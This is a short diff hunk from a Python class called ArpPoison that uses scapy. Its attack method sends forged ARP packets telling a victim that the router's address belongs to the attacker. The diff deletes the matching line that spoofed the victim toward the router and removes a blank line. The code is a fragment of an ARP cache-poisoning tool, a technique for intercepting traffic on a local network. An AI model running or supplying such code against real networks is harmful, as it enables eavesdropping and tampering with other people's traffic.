@@ -36,12 +36,10 @@ class ArpPoison():
         #configure scapy's variable for sending packets
         conf.iface= self.iface
 
-
     def attack(self):
         """Start to send poisoned packets to the victim"""
         #create and send FAKE arp packets
         send(ARP(psrc = self.router,pdst = self.victim),verbose = self.verbose)
-        send(ARP(psrc = self.victim,pdst = self.router),verbose = self.verbose)
         
     def setIFace(self, iface):
         self.iface = iface
